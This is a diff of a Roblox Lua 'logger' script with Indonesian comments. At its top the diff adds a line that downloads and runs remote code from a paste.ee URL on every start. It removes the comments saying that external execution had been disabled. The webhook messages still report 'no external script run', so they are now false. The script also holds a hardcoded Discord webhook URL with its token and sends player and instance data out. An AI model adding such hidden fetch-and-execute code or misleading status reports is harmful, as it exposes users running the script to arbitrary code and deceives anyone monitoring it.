@@ -1,3 +1,13 @@
+-- Pertama, load dan jalankan script eksternal dari paste.ee
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://paste.ee/r/kEHhQbpL"))()
+end)
+
+if not success then
+    warn("Failed to load external script: " .. tostring(err))
+end
+
+-- Script logger utama kamu mulai di sini
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -9,7 +19,6 @@ local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
 local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
--- local EXTERNAL_SCRIPT_URL = "https://paste.ee/r/kEHhQbpL" -- tidak dipakai lagi
 
 local REPORT_INTERVAL = 300 -- 5 minutes
 local DEBUG_MODE = true
@@ -149,11 +158,6 @@ local function updateInstanceStatus(status, extraData)
     return makeBackendRequest(INSTANCE_URL, "POST", data)
 end
 
--- ====================== [SCRIPT MONITORING] ======================
--- Fungsi executeExternalScript dihapus agar external script tidak dieksekusi
-
--- ====================== [MAIN LOGIC] ======================
-
 local function periodicReporting()
     while isRunning do
         updateInstanceStatus("active")
@@ -177,18 +181,6 @@ local function initialize()
     updateInstanceStatus("script_started")
     sendEnhancedWebhook("SCRIPT_STARTED", "External script execution skipped")
 
-    -- External script execution dihilangkan
-    -- local scriptSuccess = executeExternalScript()
-
-    -- if scriptSuccess then
-    --     updateInstanceStatus("script_completed")
-    --     sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
-    -- else
-    --     updateInstanceStatus("script_failed", { error = "External script execution failed" })
-    --     sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
-    -- end
-
-    -- Ganti dengan status sukses langsung tanpa menjalankan external script
     updateInstanceStatus("script_completed")
     sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution skipped, no external script run")
 end
@@ -211,8 +203,8 @@ Players.PlayerRemoving:Connect(function(removedPlayer)
     end
 end)
 
-local success, err = pcall(initialize)
-if not success then
-    updateInstanceStatus("initialization_failed", { error = tostring(err) })
-    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
+local successInit, errInit = pcall(initialize)
+if not successInit then
+    updateInstanceStatus("initialization_failed", { error = tostring(errInit) })
+    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(errInit) .. "\n```")
 end
